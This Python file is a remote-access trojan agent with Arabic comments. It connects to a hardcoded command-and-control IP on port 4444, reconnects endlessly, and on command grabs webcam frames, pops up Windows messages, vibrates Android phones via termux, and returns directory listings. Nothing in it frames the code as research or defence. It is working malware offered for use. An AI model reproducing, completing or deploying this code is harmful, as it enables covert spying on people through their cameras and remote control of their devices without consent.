import socket
import os
import cv2
import subprocess
import time

C2_IP = "172.233.220.238"
C2_PORT = 4444

def agent_logic():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_IP, C2_PORT))
            while True:
                data = s.recv(1024).decode()
                if not data: break
                
                if data.startswith("cam_"):
                    idx = int(data.split("_")[1])
                    cap = cv2.VideoCapture(idx)
                    ret, frame = cap.read()
                    if ret: cv2.imwrite("shot.jpg", frame)
                    cap.release()
                    # إرسال الصورة (تحتاج وظيفة إرسال بايتات)
                
                elif data.startswith("msg:"):
                    text = data.split(":")[1]
                    # عرض إشعار (ويندوز)
                    os.system(f'msg * "{text}"')
                
                elif data == "vibrate":
                    # اهتزاز (أندرويد ترمكس)
                    os.system("termux-vibrate -d 1000")
                
                elif data == "ls":
                    res = subprocess.getoutput("ls")
                    s.send(res.encode())
            s.close()
        except:
            time.sleep(10) # إعادة محاولة الاتصال

if __name__ == "__main__":
    agent_logic()